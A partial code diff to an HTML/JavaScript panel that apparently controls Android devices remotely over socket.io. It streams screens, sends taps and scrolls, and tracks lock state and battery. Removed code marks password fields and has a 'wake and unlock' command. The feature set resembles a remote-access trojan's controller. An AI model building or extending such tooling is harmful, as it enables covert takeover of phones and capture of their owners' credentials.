+                this.elements.streamStatus.textContent = 'Live Stream: On';
+                this.elements.streamStatus.style.color = '#44ff44';
+            }
+            
+            stopLiveStream() {
+                if (!this.activeDeviceId || !this.isLiveStreaming) return;
+                
+                this.sendCommand('stop_live_stream', {});
+                this.isLiveStreaming = false;
+                this.elements.liveIndicator.classList.remove('active');
+                this.elements.streamStatus.textContent = 'Live Stream: Off';
+                this.elements.streamStatus.style.color = '#ff4444';
+            }
+            
+            // Data Handlers
+            handleScreenUpdate(data) {
+                if (data.deviceId !== this.activeDeviceId) return;
+                
+                this.elements.blackScreenContainer.innerHTML = '';
+                
                 if (data.lockType) {
-                    lockStatusEl.textContent = `Lock: ${data.lockType}`;
-                    lockStatusEl.style.color = data.lockType !== "none" ? "#ff4444" : "#44ff44";
+                    this.elements.lockStatus.textContent = `Lock: ${data.lockType}`;
+                    this.elements.lockStatus.style.color = data.lockType !== "none" ? "#ff4444" : "#44ff44";
                 }
                 
-                // कीबोर्ड हाइड
-                keyboardButtons.style.display = 'none';
-                currentKeyboardElement = null;
-                
-                data.elements.forEach(element => {
+                // Create screen elements
+                data.elements?.forEach(element => {
                     const el = document.createElement('div');
                     el.className = 'screen-element';
-                    el.style.left = `${element.x}px`; 
+                    el.style.left = `${element.x}px`;
                     el.style.top = `${element.y}px`;
-                    el.style.width = `${element.width}px`; 
+                    el.style.width = `${element.width}px`;
                     el.style.height = `${element.height}px`;
                     
-                    // विशेष स्टाइल
-                    if (element.isKeyboard) {
-                        el.style.borderColor = '#ff9900';
-                        el.style.backgroundColor = 'rgba(255, 153, 0, 0.3)';
-                    }
-                    if (element.isPassword) {
-                        el.style.borderColor = '#ff3333';
-                        el.style.backgroundColor = 'rgba(255, 51, 51, 0.2)';
+                    if (element.clickable) {
+                        el.style.borderColor = '#0099ff';
+                        el.style.backgroundColor = 'rgba(0, 153, 255, 0.3)';
                     }
                     if (element.editable) {
                         el.style.borderColor = '#33cc33';
                         el.style.backgroundColor = 'rgba(51, 204, 51, 0.2)';
                     }
-                    if (element.isNumber) {
-                        el.style.borderColor = '#9966ff';
-                        el.style.backgroundColor = 'rgba(153, 102, 255, 0.2)';
-                    }
                     
                     const textEl = document.createElement('div');
                     textEl.className = 'element-text';
-                    
-                    if (element.contentDescription) {
-                        const desc = element.contentDescription.toLowerCase();
-                        if (desc.includes("more options")) { 
-                            textEl.textContent = '⋮'; 
-                            textEl.style.fontSize = '20px'; 
-                        }
-                        else if (desc.includes("navigate up") || desc.includes("drawer")) { 
-                            textEl.textContent = '≡'; 
-                            textEl.style.fontSize = '20px'; 
-                        }
-                        else if (desc.includes("keyboard")) {
-                            textEl.textContent = '⌨️'; 
-                            textEl.style.fontSize = '16px';
-                        }
-                        else if (element.text) {
-                            textEl.textContent = element.text;
-                        } else {
-                            textEl.textContent = element.contentDescription;
-                        }
-                    } else if (element.text) {
-                        textEl.textContent = element.text;
-                    } else if (element.className) {
-                        const shortName = element.className.split('.').pop();
-                        textEl.textContent = shortName.length > 10 ? shortName.substring(0, 8) + '..' : shortName;
-                    }
-                    
+                    textEl.textContent = element.text || element.contentDescription || '';
                     el.appendChild(textEl);
                     
-                    // क्लिक इवेंट
                     el.addEventListener('click', () => {
                         const tapX = Math.round(element.x + (element.width / 2));
                         const tapY = Math.round(element.y + (element.height / 2));
-                        
-                        socket.emit('command_to_device', { 
-                            deviceId: activeDeviceId, 
-                            action: 'touch_command', 
-                            payload: { x: tapX, y: tapY } 
-                        });
-                        
-                        // कीबोर्ड शो करें
-                        if (element.editable || element.isKeyboard || element.isNumber) {
-                            currentKeyboardElement = element;
-                            showVirtualKeyboard(element);
-                        }
+                        this.sendCommand('touch_command', { x: tapX, y: tapY });
                     });
                     
-                    screenContainer.appendChild(el);
-                });
-            });
-        });
-
-        function showVirtualKeyboard(element) {
-            keyboardButtons.innerHTML = '';
-            keyboardButtons.style.display = 'block';
-            
-            // सरल कीबोर्ड
-            const keyboardLayout = [
-                ['1','2','3','4','5','6','7','8','9','0'],
-                ['q','w','e','r','t','y','u','i','o','p'],
-                ['a','s','d','f','g','h','j','k','l'],
-                ['z','x','c','v','b','n','m','⌫'],
-                ['space','enter']
-            ];
-            
-            keyboardLayout.forEach(row => {
-                const rowDiv = document.createElement('div');
-                rowDiv.className = 'key-row';
-                
-                row.forEach(key => {
-                    const keyBtn = document.createElement('button');
-                    keyBtn.className = 'key-btn';
-                    keyBtn.textContent = key;
-                    
-                    if (key === '⌫') keyBtn.classList.add('special');
-                    if (key === 'enter') keyBtn.classList.add('enter');
-                    
-                    keyBtn.onclick = () => {
-                        const tapX = Math.round(element.x + element.width/2);
-                        const tapY = Math.round(element.y + element.height/2);
-                        
-                        // पहले एलिमेंट पर टैप करें
-                        socket.emit('command_to_device', { 
-                            deviceId: activeDeviceId, 
-                            action: 'touch_command', 
-                            payload: { x: tapX, y: tapY } 
-                        });
-                    };
-                    
-                    rowDiv.appendChild(keyBtn);
+                    this.elements.blackScreenContainer.appendChild(el);
                 });
                 
-                keyboardButtons.appendChild(rowDiv);
-            });
+                this.showLoading(false);
+            }
+            
+            handleLiveScreen(data) {
+                if (data.deviceId !== this.activeDeviceId) return;
+                
+                this.elements.liveScreenImage.src = 'data:image/jpeg;base64,' + data.liveImage;
+                this.showLoading(false);
+            }
+            
+            handleHeartbeat(data) {
+                // Update device info if available
+                if (data.deviceId && this.devices[data.deviceId]) {
+                    const device = this.devices[data.deviceId];
+                    device.battery = data.battery;
+                    device.lockType = data.lockType;
+                    
+                    const infoEl = document.querySelector(`#device-${data.deviceId} .device-info`);
+                    if (infoEl) {
+                        infoEl.innerHTML = `Battery: ${data.battery}% | Lock: ${data.lockType || "none"}`;
+                    }
+                }
+            }
+            
+            // Command Sender
+            sendCommand(action, payload) {
+                if (!this.activeDeviceId || !this.socket || !this.socket.connected) {
+                    console.log('⚠️ Cannot send command - No connection or device');
+                    return;
+                }
+                
+                this.socket.emit('command_to_device', {
+                    deviceId: this.activeDeviceId,
+                    action: action,
+                    payload: payload
+                });
+            }
         }
-
-        // स्क्रॉल कमांड
-        function sendScrollAction(direction) { 
-            if (!activeDeviceId) return; 
-            socket.emit('command_to_device', { 
-                deviceId: activeDeviceId, 
-                action: 'scroll_action', 
-                payload: { direction: direction } 
-            }); 
-        }
-
-        // बैक बटन
-        backToListBtn.onclick = () => { 
-            activeDeviceId = null; 
-            showView('device-list-view'); 
-        };
-
-        // कंट्रोल बटन
-        document.getElementById('btn-back').onclick = () => {
-            if (!activeDeviceId) return;
-            socket.emit('command_to_device', { 
-                deviceId: activeDeviceId, 
-                action: 'scroll_action', 
-                payload: { direction: 'left' } 
-            });
-        };
-        document.getElementById('btn-home').onclick = () => {
-            if (!activeDeviceId) return;
-            socket.emit('command_to_device', { 
-                deviceId: activeDeviceId, 
-                action: 'touch_command', 
-                payload: { x: 100, y: 100 } 
-            });
-        };
-        document.getElementById('btn-recents').onclick = () => {
-            if (!activeDeviceId) return;
-            socket.emit('command_to_device', { 
-                deviceId: activeDeviceId, 
-                action: 'scroll_action', 
-                payload: { direction: 'right' } 
-            });
-        };
         
-        document.getElementById('btn-scroll-up').onclick = () => sendScrollAction('up');
-        document.getElementById('btn-scroll-down').onclick = () => sendScrollAction('down');
-        document.getElementById('btn-scroll-left').onclick = () => sendScrollAction('left');
-        document.getElementById('btn-scroll-right').onclick = () => sendScrollAction('right');
-
-        // ============ मुख्य बटन: WAKE & UNLOCK ============
-        wakeUnlockBtn.onclick = () => { 
-            if (!activeDeviceId) {
-                alert("Please select a device first!");
-                return;
-            } 
-            
-            // बटन एनिमेशन
-            wakeUnlockBtn.innerHTML = '⚡ PROCESSING...';
-            wakeUnlockBtn.style.opacity = '0.8';
-            wakeUnlockBtn.disabled = true;
-            
-            socket.emit('command_to_device', { 
-                deviceId: activeDeviceId, 
-                action: 'wake_and_unlock'
-            });
-            
-            // 3 सेकंड बाद बटन रीसेट
-            setTimeout(() => {
-                wakeUnlockBtn.innerHTML = '⚡ WAKE & UNLOCK';
-                wakeUnlockBtn.style.opacity = '1';
-                wakeUnlockBtn.disabled = false;
-            }, 3000);
-        };
-
-        // हार्टबीट
-        setInterval(() => { 
-            if (socket.connected) socket.emit('heartbeat', {}); 
-        }, 30000);
+        // Initialize the connection manager
+        const connectionManager = new ConnectionManager();
     </script>
 </body>
 </html>
